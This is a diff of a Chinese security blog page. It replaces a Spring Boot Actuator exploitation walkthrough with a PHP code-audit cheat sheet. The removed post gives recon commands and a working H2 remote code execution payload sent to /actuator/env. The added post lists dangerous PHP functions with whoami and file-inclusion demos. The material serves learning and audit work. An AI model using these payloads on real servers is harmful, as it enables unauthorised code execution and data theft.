@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Spring | Mr.Frame</title>
+  <title>PHP代码审计 | Mr.Frame</title>
   <meta name="keywords" content="">
-  <meta name="description" content="Spring | Mr.Frame">
+  <meta name="description" content="PHP代码审计 | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在!!!">
 <meta property="og:type" content="website">
@@ -1095,9 +1095,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Spring" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-PHP代码审计" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Spring</h1>
+        <h1 class="article-title">PHP代码审计</h1>
     
     <div class="article-meta">
         
@@ -1107,9 +1107,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Coding">Coding</a>
             
         </span>
         
@@ -1117,12 +1115,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-11-15 20:55:58'>2021-11-15 20:55</time>
+            Created At : <time class="date" title='Updated At: 2022-04-09 21:05:43'>2022-04-09 21:05</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:902</span>
+        <span>Count:678</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1152,7 +1150,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD"><span class="toc-text">安全措施</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Table-of-Contents"><span class="toc-text">Table of Contents</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-Audit"><span class="toc-text">PHP Audit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF"><span class="toc-text">代码审计常见思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Untrusted-Data-%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%8F%AF%E4%BF%A1%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text">Untrusted Data ,使用不可信的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Execution-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">Command Execution, 命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Execution-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">Code Execution, 代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Information-Discloure-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">Information Discloure, 信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-Cryptographic-Functions-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0"><span class="toc-text">Insecure Cryptographic Functions, 不安全的加密函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">常见危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">代码执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-text">包含函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">命令执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-text">文件操作函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0"><span class="toc-text">特殊函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1172,77 +1170,193 @@
 <ul>
 <li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
-<p>推荐资料：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li>
-<li><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cwkiller/p/12829974.html">Spring Boot Actuator H2 RCE复现</a></li>
-</ul>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91a5ca9b7c1c">Spring Boot Actuator(eureka xstream deserialization RCE)</a></li>
-</ul>
-<p><strong>Spring</strong> 是为解决企业应用开发的复杂性而创建的一个开源框架。<br>    主要的设计思想是有两个：</p>
-<ul>
-<li><code>控制反转IOC</code><br>IOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。</li>
-<li><code>面向方面编程AOP</code><br>利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。</li>
-</ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">nmap -Pn -T4  -p 8080  -sV --version-all 192.168.79.28
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CST
-Nmap scan report for 192.168.79.28
-Host is up (0.00019s latency).
-
-PORT     STATE SERVICE    VERSION
-8080/tcp open  http-proxy</code></pre>
-<p>访问不存在的页面包含以下信息证明使用了Spring Boot</p>
-<pre><code class="html">Whitelabel Error Page
-
-This application has no explicit mapping for /error, so you are seeing this as a fallback.
-Tue Dec 15 09:35:57 GMT 2020
-There was an unexpected error (type=Not Found, status=404).
-No message available</code></pre>
-<p>Spring API信息获取</p>
-<pre><code class="zsh">curl -v &#39;http://192.168.79.28:8080/trace&#39;  # 获取用户认证字段
-curl -v &#39;http://192.168.79.28:8080/env&#39;    # 服务器配置信息，包括数据库
-curl -v &#39;http://192.168.79.28:8080/health&#39;  # 泄漏git项目地址
-curl -v &#39;http://192.168.79.28:8080/heapdump&#39; # 泄漏后台用户信息
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-curl -v &#39;http://192.168.79.28:8080/&#39;
-
-## Spring Boot Actuator H2 with HikariCP远程代码执行
-
-**Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。  
-
-Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的
-
-更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/)
-
-```zsh
- curl  &#39;http://192.168.79.28:8080/actuator&#39;  # 查看actuator下的端点actuator/env
-&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;restart&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/restart&quot;,&quot;templated&quot;:false&#125;&#125;&#125;%</code></pre>
-<p>发送EXP</p>
-<pre><code class="json">POST /actuator/env HTTP/1.1
-
-content-type: application/json
-
-&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&#125;
-
-
-POST /actuator/restart HTTP/1.1
-
-content-type: application/json
-
-&#123;&#125;
-</code></pre>
-<pre><code class="zsh">curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; --data-binary $&#39;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#39;,\&#39; java.util.Scanner(Runtime.getRun\&#39;,\&#39;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#39;);CALL EXEC(\&#39;curl http://x.burpcollaborator.net\&#39;);\&quot;&#125;&#39; &#39;http://192.168.79.28:8080/actuator/env&#39;
-
-#发送exp
-curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://192.168.79.28:8080/actuator/restart&#39;   # 触发exp</code></pre>
-<h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><ol>
-<li>引入 security 依赖，打开安全限制并进行身份验证</li>
-<li>设置单独的 Actuator 管理端口并配置不对外网开放</li>
+<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol>
+<li><a href="#org0fff461">PHP Audit</a><ol>
+<li> <a href="#org8eab023">代码审计常见思路</a></li>
+<li> <a href="#orgd90071d">Untrusted Data ,使用不可信的数据</a></li>
+<li> <a href="#org593992a">Command Execution, 命令执行</a></li>
+<li> <a href="#orgaf7a00a">Code Execution, 代码执行</a></li>
+<li> <a href="#org00773a4">Information Discloure, 信息泄露</a></li>
+<li> <a href="#org9c1cc21">Insecure Cryptographic Functions, 不安全的加密函数</a></li>
 </ol>
+</li>
+<li><a href="#org7fd6349">常见危险函数</a><ol>
+<li> <a href="#orgd42787f">代码执行函数</a></li>
+<li> <a href="#orga4dc3ae">包含函数</a></li>
+<li> <a href="#orgb5e23c0">命令执行函数</a></li>
+<li> <a href="#org7b93cfd">文件操作函数</a></li>
+<li> <a href="#org8ef722f">特殊函数</a></li>
+<li> <a href="#orgabca0d4">变量覆盖</a></li>
+</ol>
+</li>
+</ol>
+<p><a id="org0fff461"></a></p>
+<h1 id="PHP-Audit"><a href="#PHP-Audit" class="headerlink" title="PHP Audit"></a>PHP Audit</h1><p><a target="_blank" rel="noopener" href="https://github.com/ripsscanner/rips">RIPS</a>  <a target="_blank" rel="noopener" href="https://github.com/nccgroup/VCG">VCG</a></p>
+<p>代码审计本质： <code>unfilter_function(param_input)</code><br>找漏洞 -&gt; 找可以控制的变量(参数)=param<sub>input</sub>= -&gt; 危险函数(param<sub>input</sub>)</p>
+<p>漏洞形成条件：</p>
+<ul>
+<li>  可以控制的变量(外部输入)       &#x2013;&gt;  内因</li>
+<li>  危险(未过滤参数)函数接收外部输入 &#x2013;&gt; 决定漏洞的类型</li>
+</ul>
+<p>隐式输入： 用户传递数据-&gt; 数据库/缓存文件等地方 -&gt; 程序代码处理-&gt;程序代码<br>显式输入： 用户传递数据-&gt; 程序代码处理</p>
+<p><a id="org8eab023"></a></p>
+<h2 id="代码审计常见思路"><a href="#代码审计常见思路" class="headerlink" title="代码审计常见思路"></a>代码审计常见思路</h2><ul>
+<li>  正向追踪： 变量  &#x2013;&gt; 函数</li>
+<li>  逆向追踪： 函数  &#x2013;&gt; 变量</li>
+<li>  常见功能点定向审计</li>
+<li>  第三方组件,中间件版本比对</li>
+<li>  补丁比对，反推漏洞位置</li>
+<li>  工具扫描+人工验证</li>
+</ul>
+<p><a id="orgd90071d"></a></p>
+<h2 id="Untrusted-Data-使用不可信的数据"><a href="#Untrusted-Data-使用不可信的数据" class="headerlink" title="Untrusted Data ,使用不可信的数据"></a>Untrusted Data ,使用不可信的数据</h2><p><code>$_REQUEST</code> 参数中的数据是浏览器可控的，黑客可以通过巧妙的构造覆盖PHP全局参数</p>
+<p><a id="org593992a"></a></p>
+<h2 id="Command-Execution-命令执行"><a href="#Command-Execution-命令执行" class="headerlink" title="Command Execution, 命令执行"></a>Command Execution, 命令执行</h2><p>PHP中存在敏感函数可以执行系统命令，常见这类函数如下：</p>
+<pre><code>exec
+shell_exec
+
+system
+passthru
+
+popen
+proc_open
+pcntl_exec</code></pre>
+<p><a id="orgaf7a00a"></a></p>
+<h2 id="Code-Execution-代码执行"><a href="#Code-Execution-代码执行" class="headerlink" title="Code Execution, 代码执行"></a>Code Execution, 代码执行</h2><p>PHP中存在敏感函数可以执行PHP代码段，常见函数如下：</p>
+<pre><code>eval
+assert
+preg_replace
+create_function</code></pre>
+<p><a id="org00773a4"></a></p>
+<h2 id="Information-Discloure-信息泄露"><a href="#Information-Discloure-信息泄露" class="headerlink" title="Information Discloure, 信息泄露"></a>Information Discloure, 信息泄露</h2><p>常见信息泄露的函数有 <code>phpinfo~、~show_source</code></p>
+<p><a id="org9c1cc21"></a></p>
+<h2 id="Insecure-Cryptographic-Functions-不安全的加密函数"><a href="#Insecure-Cryptographic-Functions-不安全的加密函数" class="headerlink" title="Insecure Cryptographic Functions, 不安全的加密函数"></a>Insecure Cryptographic Functions, 不安全的加密函数</h2><ul>
+<li>  md5</li>
+<li>  CRYPT<sub>STD</sub><sub>DES</sub></li>
+<li>  CRYPT<sub>EXT</sub><sub>DES</sub></li>
+<li>  CRYTPT<sub>MD5等</sub></li>
+</ul>
+<p><a id="org7fd6349"></a></p>
+<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><p><a id="orgd42787f"></a></p>
+<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><ul>
+<li><p>  <code>eval()</code></p>
+</li>
+<li><p>  <code>assert()</code></p>
+</li>
+<li><p>  <code>preg_replace</code></p>
+</li>
+<li><p>  <code>create_funtion</code></p>
+</li>
+<li><p>  <code>call_user_func</code></p>
+</li>
+<li><p><code>call_user_func_array</code></p>
+<pre><code>  @eval(&#39;echo &quot;test-echo&quot;;&#39;);
+  echo &#39;&lt;hr&gt;&#39;;
+  assert(&#39;system(&quot;whoami&quot;)&#39;);
+  // preg_replace(&quot;/test/e&quot;,&quot;phpinfo();&quot;,&quot;just test&quot;);
+
+  echo &#39;&lt;hr&gt;&#39;;
+  $cfunc=create_function(&#39;$v&#39;,&#39;return system($v);&#39;);
+  $cfunc(&#39;whoami&#39;);
+
+  echo &#39;&lt;hr&gt;&#39;;
+  $sfunc=&#39;sys&#39;.&#39;tem&#39;;
+  $sfunc(&#39;whoami&#39;);
+
+  echo &#39;&lt;hr&gt;&#39;;
+  function callback($var)&#123;
+           echo &quot;call test $var&quot;;
+  &#125;
+  call_user_func(&#39;callback&#39;,&#39;crkmyth1cal&#39;);</code></pre>
+</li>
+</ul>
+<p><a id="orga4dc3ae"></a></p>
+<h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><ul>
+<li><p>  <code>require</code></p>
+</li>
+<li><p>  <code>include</code></p>
+</li>
+<li><p>  <code>require_once</code></p>
+</li>
+<li><p><code>include_once</code></p>
+<p>  include $file;</p>
+<p>  include($_GET[‘file’]);<br>  //     ?file=php://filter/convert.base64-encode/resource=index.php</p>
+</li>
+</ul>
+<p><a id="orgb5e23c0"></a></p>
+<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><ul>
+<li><p>  <code>exec</code></p>
+</li>
+<li><p>  <code>system</code></p>
+</li>
+<li><p>  <code>popen</code></p>
+</li>
+<li><p>  <code>proc_open</code></p>
+</li>
+<li><p>  <code>passthru</code></p>
+</li>
+<li><p><code>shell_exec</code></p>
+<p>  echo shell_exec(‘ping <a target="_blank" rel="noopener" href="http://www.baidu.com&/#39;">www.baidu.com&#39;</a>);<br>  echo shell_exec(‘whoami’);</p>
+</li>
+</ul>
+<p><a id="org7b93cfd"></a></p>
+<h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><p>读取：读取配置文件，获取key<br>写入：写入shell代码<br>删除：删除 <code>.lock</code> 文件，重新安装</p>
+<ul>
+<li><p>  <code>copy</code></p>
+</li>
+<li><p>  <code>file_get_contents</code></p>
+</li>
+<li><p>  <code>file_put_contents</code></p>
+</li>
+<li><p>  <code>file</code></p>
+</li>
+<li><p>  <code>glob</code></p>
+</li>
+<li><p>  <code>fopen</code></p>
+</li>
+<li><p>  <code>move_uploaded_file</code></p>
+</li>
+<li><p>  <code>readfile</code></p>
+</li>
+<li><p>  <code>rename</code></p>
+</li>
+<li><p>  <code>delete</code></p>
+</li>
+<li><p>  <code>rmdir</code></p>
+</li>
+<li><p>  <code>unlink</code></p>
+</li>
+<li><p>  <code>symlink</code></p>
+</li>
+<li><p><code>readlink</code></p>
+<pre><code>  file_put_contents(&quot;baidu.txt&quot;,file_get_contents(&quot;https://www.baidu.com&quot;));
+  unlink(&#39;baidu.txt&#39;);</code></pre>
+</li>
+</ul>
+<p><a id="org8ef722f"></a></p>
+<h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><ul>
+<li>  <code>phpinfo</code></li>
+<li>  <code>getenv</code></li>
+<li>  <code>putenv</code></li>
+<li>  <code>dl</code></li>
+<li>  <code>ini_get</code></li>
+<li>  <code>ini_set</code></li>
+<li>  <code>ini_alter</code></li>
+<li>  <code>ini_restore</code></li>
+<li>  <code>is_numeric</code></li>
+<li>  <code>in_array</code></li>
+</ul>
+<p><a id="orgabca0d4"></a></p>
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><ul>
+<li>  <code>parse_str</code></li>
+<li>  <code>mb_parse_str</code></li>
+<li>  <code>extract</code></li>
+<li>  <code>import_request_variables</code></li>
+<li>  <code>get_defined_vars</code></li>
+<li>  <code>get_defined_constants</code></li>
+<li>  <code>get_defined_functions</code></li>
+<li>  <code>get_included_files</code></li>
+</ul>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
